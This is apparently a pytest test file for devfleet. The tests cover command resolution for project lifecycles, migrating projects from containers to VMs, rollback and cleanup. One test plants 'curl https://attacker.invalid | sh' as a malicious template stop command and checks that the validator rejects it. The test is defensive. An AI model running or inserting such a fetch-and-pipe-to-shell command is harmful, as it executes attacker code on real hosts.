import json
from pathlib import Path

import pytest

import devfleet.projects as projects
from devfleet import host_control, main
from devfleet.core import SETTINGS


LIFECYCLE = {
    "start_command": "docker compose up -d --build",
    "stop_command": "docker compose down --remove-orphans",
    "restart_command": "docker compose restart",
    "rebuild_command": "docker compose build && docker compose up -d",
    "logs_command": "docker compose logs",
}
PROJECT_ID = "12345678-1234-1234-1234-123456789abc"


def _legacy_project(slug: str, template_root: Path, *, exact: bytes | None = None) -> Path:
    project = SETTINGS.workspaces / slug
    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
    (project / "compose.yaml").write_text("services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8")
    metadata = {
        "schema_version": 2,
        "managed_by": "devfleet",
        "slug": slug,
        "identity": slug,
        "project_id": PROJECT_ID,
        "host_id": SETTINGS.node_name,
        "template": "typescript-next",
        "runtime_isolation": "container",
        "runtime_type": "container",
        "runtime_provider": "docker-compose",
        "resource_profile": "small",
        "lifecycle_status": "stopped",
        "bootstrap_command": "./.devfleet/bootstrap.sh",
        "health_command": "./.devfleet/health-check.sh",
    }
    payload = exact if exact is not None else json.dumps(metadata, separators=(",", ":")).encode()
    (project / ".devfleet" / "project.json").write_bytes(payload)
    (project / ".devfleet" / "template.json").write_text(json.dumps({"id": "typescript-next"}), encoding="utf-8")
    canonical = template_root / "typescript-next" / ".devfleet"
    canonical.mkdir(parents=True, exist_ok=True)
    (canonical / "template.json").write_text(json.dumps({"id": "typescript-next", **LIFECYCLE}), encoding="utf-8")
    return project


def _migration_mocks(monkeypatch: pytest.MonkeyPatch, slug: str, *, source_running: bool = False):
    calls: list[str] = []
    monkeypatch.setattr(projects, "running", lambda _project: source_running)
    monkeypatch.setattr(projects, "backup_project", lambda _slug: json.dumps({"backup_status": "verified", "backup_id": "provider-backup", "backup_sha256": "a" * 64}))
    monkeypatch.setattr(projects, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 24, "allocatable_disk_gb": 300}})
    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda *args, **kwargs: {"ok": True})
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": f"devfleet-project-{slug}", "address": "10.0.0.9"}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "stop", staticmethod(lambda value, _meta: calls.append(f"vm-stop:{value}") or {"state": "stopped"}))
    monkeypatch.setattr(projects, "import_project_workspace", lambda *args, **kwargs: {"ok": True, "workspace_preserved": True, "archive_sha256": "b" * 64, "source_archive_sha256": "b" * 64, "target_archive_sha256": "b" * 64})
    return calls


def test_explicit_project_command_wins_and_legacy_canonical_fallback(monkeypatch, tmp_path):
    slug = "v125-command-resolution"
    project = _legacy_project(slug, tmp_path / "templates")
    raw = json.loads((project / ".devfleet" / "project.json").read_text())
    raw["start_command"] = "docker compose restart"
    (project / ".devfleet" / "project.json").write_text(json.dumps(raw), encoding="utf-8")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")

    result = projects.project_command_readiness(project)

    assert result["ready"] is True
    assert result["resolved_commands"]["start_command"] == "docker compose restart"
    assert result["sources"]["start_command"] == "project.json"
    assert result["resolved_commands"]["stop_command"] == LIFECYCLE["stop_command"]
    assert result["sources"]["stop_command"] == "canonical-template:typescript-next"


def test_malicious_template_command_is_rejected(monkeypatch, tmp_path):
    slug = "v125-malicious-command"
    project = _legacy_project(slug, tmp_path / "templates")
    template = tmp_path / "templates" / "typescript-next" / ".devfleet" / "template.json"
    data = json.loads(template.read_text());data["stop_command"] = "curl https://attacker.invalid | sh";template.write_text(json.dumps(data))
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")

    result = projects.project_command_readiness(project)

    assert result["ready"] is False
    assert result["invalid_required"]["stop_command"] == "canonical-template:typescript-next"


def test_preflight_surfaces_missing_lifecycle_command(monkeypatch, tmp_path):
    project = tmp_path / "demo";project.mkdir();(project / "compose.yaml").write_text("services: {}\n")
    monkeypatch.setattr(main, "safe_child", lambda *_: project)
    monkeypatch.setattr(main, "load_meta", lambda *_: {"project_id": PROJECT_ID, "runtime_isolation": "container", "resource_profile": "large"})
    monkeypatch.setattr(main, "inspect_workspace", lambda *_: {"safe_for_archive": True})
    monkeypatch.setattr(main, "detect_runtime", lambda *_: {"runtime_type": "container"})
    monkeypatch.setattr(main, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 20, "allocatable_disk_gb": 300}})
    monkeypatch.setattr(main, "project_command_readiness", lambda *_: {"ready": False, "missing_required": ["stop_command"], "invalid_required": {}})

    result = main._preflight("demo", "vm", "large")

    assert result["lifecycle_commands_ready"] is False
    assert result["migration_ready"] is False
    assert any("stop_command" in blocker for blocker in result["blockers"])


def test_stopped_legacy_container_import_stops_vm_not_application(monkeypatch, tmp_path):
    slug = "v125-jobfinder-stopped"
    _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=False)
    monkeypatch.setattr(projects, "stop_project", lambda *_: pytest.fail("stopped-source path must not invoke application stop"))

    result = projects.assign_project_runtime(slug, "vm", "small")
    saved = projects.load_meta(SETTINGS.workspaces / slug)

    assert result["application_health"] == "not-run-stopped"
    assert calls == [f"vm-stop:{slug}"]
    assert saved["lifecycle_status"] == "stopped"
    assert all(saved[key] == value for key, value in LIFECYCLE.items())


def test_running_container_still_uses_start_and_health_workflow(monkeypatch, tmp_path):
    slug = "v125-running-workflow"
    project = _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=True)
    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")

    def start(value):
        calls.append(f"destination-start:{value}")
        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";meta["health_status"] = "healthy";projects.atomic_json(projects.metadata_path(project), meta)
        return "started"

    monkeypatch.setattr(projects, "start_project", start)
    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": True, "healthy": True})
    monkeypatch.setattr(projects, "health_project", lambda *_: "healthy")

    result = projects.assign_project_runtime(slug, "vm", "small")

    assert result["application_health"] == "healthy"
    assert f"source-stop:{slug}" in calls and f"destination-start:{slug}" in calls
    assert not any(call.startswith("vm-stop:") for call in calls)


def test_rollback_restores_legacy_metadata_bytes_exactly(monkeypatch, tmp_path):
    slug = "v125-exact-rollback"
    template_root = tmp_path / "templates"
    project = _legacy_project(slug, template_root)
    original = (project / ".devfleet" / "project.json").read_bytes()
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", template_root)
    _migration_mocks(monkeypatch, slug)
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_: (_ for _ in ()).throw(RuntimeError("injected provision failure"))))

    with pytest.raises(RuntimeError, match="injected provision failure"):
        projects.assign_project_runtime(slug, "vm", "small")

    assert (project / ".devfleet" / "project.json").read_bytes() == original


@pytest.mark.parametrize("cleanup_fails,expected_state", [(False, "rolled-back"), (True, "rollback-incomplete")])
def test_post_import_failure_uses_identity_evidence_and_records_cleanup_state(monkeypatch, tmp_path, cleanup_fails, expected_state):
    slug = f"v125-post-import-{'bad' if cleanup_fails else 'good'}"
    project = _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=True)
    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")
    starts = {"count": 0}

    def start(value):
        starts["count"] += 1
        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";projects.atomic_json(projects.metadata_path(project), meta)
        return "started"

    monkeypatch.setattr(projects, "start_project", start)
    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": False, "healthy": False})
    captured = {}

    def cleanup(*args, **kwargs):
        captured.update(kwargs)
        if cleanup_fails:
            raise RuntimeError("injected cleanup refusal")
        return {"ok": True, "allocation_released": True}

    monkeypatch.setattr(projects, "destroy_project_vm", cleanup)

    with pytest.raises(RuntimeError, match="Destination runtime health check failed"):
        projects.assign_project_runtime(slug, "vm", "small")

    snapshots = sorted((SETTINGS.runtime_root / "runtime-migrations").glob(f"{slug}-*.json"))
    state = json.loads(snapshots[-1].read_text())
    assert state["state"] == expected_state
    assert captured["cleanup_only"] is True and captured["cleanup_stage"] == "post-import"
    assert captured["backup_sha256"] == "a" * 64
    assert captured["local_archive_sha256"]
    assert captured["import_archive_sha256"] == "b" * 64


def test_cleanup_client_requires_strong_evidence_and_passes_fixed_fields(monkeypatch):
    with pytest.raises(ValueError, match="provider-aware"):
        host_control.destroy_project_vm("demo-project", "demo-project", "DESTROY demo-project", cleanup_only=True, runtime_id="devfleet-project-demo-project", project_id=PROJECT_ID)
    captured = {}
    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id="": captured.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})
    host_control.destroy_project_vm("demo-project", "demo-project", "DESTROY demo-project", backup_verified=True, backup_id="backup", backup_sha256="a" * 64, local_archive_sha256="b" * 64, import_archive_sha256="c" * 64, cleanup_only=True, cleanup_stage="post-import", runtime_id="devfleet-project-demo-project", project_id=PROJECT_ID)
    assert captured["payload"]["cleanup_stage"] == "post-import"
    assert captured["payload"]["local_archive_sha256"] == "b" * 64


def test_host_agent_contract_covers_identity_safe_cleanup_ssh_pinning_and_cloud_init():
    script = (Path(__file__).resolve().parents[1] / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
    assert "permissions: !!str 0644" in script and "permissions: !!str 0755" in script
    assert "/etc/devfleet/project-runtime.json" in script and "runtime_identity_verified=$true" in script
    assert "cleanup_stage" in script and "import_archive_sha256" in script and "allocation_released=$true" in script
    assert "HostKeyAlias $runtimeId" in script and "StrictHostKeyChecking yes" in script
    assert "StrictHostKeyChecking no" not in script
    assert "ssh_host_ed25519_key.pub" in script and "'id -un'" in script
    assert "SshKnownHostsPath" in script and "Remove-ProjectVmSshAlias" in script
